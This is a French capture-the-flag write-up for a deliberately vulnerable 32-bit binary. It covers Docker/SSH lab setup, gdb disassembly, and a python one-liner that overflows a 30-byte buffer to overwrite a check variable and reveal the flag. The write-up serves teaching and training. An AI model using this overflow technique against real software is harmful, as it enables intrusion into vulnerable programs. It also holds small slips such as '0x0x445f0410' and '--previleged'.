### Challsys (system) : easy

#### Description

You have the binary named "chall". Find a way to retrieve the flag.
We also provide a part of the source code:

```
/*
**************
 Missing code
**************
*/

  int check = 0x12345678;
  char buffer[30];
  fgets(buffer,40,stdin);
  printf("[check] 0x%x\n", check);

/*
**************
 Missing code
**************
*/
```

The source code is compiled using this command `gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 chall.c -o chall`.

#### To run

```
docker pull mbeldi/challsys
docker run -d -p 32700:22 --name <container_name> --previleged mbeldi/challsys
ssh thc18@localhost -p 32700 (password: thc18)
```

#### Write-up

Pour pouvoir résoudre ce challenge, il faut tout d'abord remarquer dans le bout de code fourni comme indice que le code est vulnérable face à une attaque du type *buffer overflow* au niveau du tableau `buffer` où on est en train de lire 40 caractères alors que sa taille est 30 on peut donc faire une attaque pour changer la valeur de `check`.

On peut essayer d'abord d'exécuter la commande `$ strings chall` où on peut trouver un autre indice, `pass: f00df00d`. Cet indice permet de connaitre qu'il y a un pass qui a comme valeur `f00df00d` mais il faut savoir maintenant si ce pass est la valeur à essayer pour résoudre le challenge.

Comme on ne connait pas le code source, on essaie de comprendre le fichier binaire. On peut maintenant utiliser gdb en exécutant `$ gdb ./chall` puis désassembler le main du binaire.

```
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048511 <+0>:	push   ebp
   0x08048512 <+1>:	mov    ebp,esp
   0x08048514 <+3>:	sub    esp,0x38
   0x08048517 <+6>:	mov    DWORD PTR [ebp-0x4],0xf00df00d
   0x0804851e <+13>:	mov    DWORD PTR [ebp-0x8],0x8048660
   0x08048525 <+20>:	mov    DWORD PTR [ebp-0xc],0x12345678
   0x0804852c <+27>:	mov    eax,ds:0x804a030
   0x08048531 <+32>:	mov    DWORD PTR [esp+0x8],eax
   0x08048535 <+36>:	mov    DWORD PTR [esp+0x4],0x30
   0x0804853d <+44>:	lea    eax,[ebp-0x2a]
   0x08048540 <+47>:	mov    DWORD PTR [esp],eax
   0x08048543 <+50>:	call   0x80483b0 <fgets@plt>
   0x08048548 <+55>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804854b <+58>:	mov    DWORD PTR [esp+0x4],eax
   0x0804854f <+62>:	mov    DWORD PTR [esp],0x804866f
   0x08048556 <+69>:	call   0x80483a0 <printf@plt>
   0x0804855b <+74>:	cmp    DWORD PTR [ebp-0xc],0xf00df00d
   0x08048562 <+81>:	jne    0x8048570 <main+95>
   0x08048564 <+83>:	mov    DWORD PTR [esp],0x8048680
   0x0804856b <+90>:	call   0x80483c0 <puts@plt>
   0x08048570 <+95>:	mov    eax,DWORD PTR [ebp-0x4]
   0x08048573 <+98>:	mov    DWORD PTR [esp],eax
   0x08048576 <+101>:	call   0x80484fd <getFood>
   0x0804857b <+106>:	cmp    eax,DWORD PTR [ebp-0xc]
   0x0804857e <+109>:	jne    0x8048598 <main+135>
   0x08048580 <+111>:	mov    DWORD PTR [esp],0x80486be
   0x08048587 <+118>:	call   0x80483c0 <puts@plt>
   0x0804858c <+123>:	mov    DWORD PTR [esp],0x80486d9
   0x08048593 <+130>:	call   0x80483d0 <system@plt>
   0x08048598 <+135>:	mov    DWORD PTR [esp+0x4],0x80486e2
   0x080485a0 <+143>:	lea    eax,[ebp-0x2a]
   0x080485a3 <+146>:	mov    DWORD PTR [esp],eax
   0x080485a6 <+149>:	call   0x8048390 <strcmp@plt>
   0x080485ab <+154>:	test   eax,eax
   0x080485ad <+156>:	jne    0x80485bb <main+170>
   0x080485af <+158>:	mov    DWORD PTR [esp],0x80486ec
   0x080485b6 <+165>:	call   0x80483c0 <puts@plt>
   0x080485bb <+170>:	mov    eax,0x0
   0x080485c0 <+175>:	leave
   0x080485c1 <+176>:	ret
End of assembler dump.
```

Pour commencer l'analyse, normalement on cherche directement l'opération `cmp` permettant de faire une vérification/comparaison.
On peut constater qu'il y a 3 vérifications dans le code, deux opération `cmp` et une opération `test` (`strcmp`).
* `cmp DWORD PTR [ebp-0xc],0xf00df00d` : on compare la valeur située à l'adresse `ebp-0xc` (la variable `check`) avec `0xf00df00d`
* `cmp eax,DWORD PTR [ebp-0xc]` : on compare la valeur du registre `eax` (qui contient la valeur retournée par la fonction `getFood`) avec la valeur située à l'adresse `ebp-0xc` (la variable `check`)
* `test eax,eax` : on vérifie si la valeur du registre `eax` est égale à 0 (`eax` contient la valeur retournée par la fonction `strcmp`)

On peut tester ensuite chaque vérification.
```
python -c "print 'A'*30 + '\x0d\xf0\x0d\xf0'" | ./chall
[check] 0xf00df00d
You're getting on the right way but you're missing something!
```

Cela permet de remplir le buffer par des 'A' et affecter à la variable check la valeur hexa `0xf00df00d`. D'après le message, on est sur le bon chemin mais il y a un truc qui nous échappe.

On continue ensuite à tester la vérification suivante. Il faut analyser alors la fonction `getFood` afin de connaître la valeur retournée par cette fonction. Faites attention, cette fonction prend un paramètre situé à l'adresse `ebp-0x4` (qui contient la valeur `0xf00df00d`).

```
(gdb) disas getFood
Dump of assembler code for function getFood:
   0x080484fd <+0>:	push   ebp
   0x080484fe <+1>:	mov    ebp,esp
   0x08048500 <+3>:	and    DWORD PTR [ebp+0x8],0xf001b001
   0x08048507 <+10>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804850a <+13>:	xor    eax,0x445f0410
   0x0804850f <+18>:	pop    ebp
   0x08048510 <+19>:	ret    
End of assembler dump.
```

On voit que la fonction fait une opération `and` entre la valeur passée en paramètre `0xf00df00d` et la valeur `0xf001b001`, puis une opération `xor` entre le résultat et la valeur `0x0x445f0410`. En calculant ça, on obtient ce resultat

```
$ python
>> hex(0xf00df00d & 0xf001b001)
'0xf001b001'
hex(0x445f0410 ^ 0xf001b001)
'0xb45eb411'
```

On essaye donc
```
$ python -c "print 'A'*30 + '\x11\xb4\x5e\xb4'" | ./chall
You Win! Congratulations!!
THC18{space_controller}
```

Voilà, on réussit le challenge. Le flag est `THC18{space_controller}`.

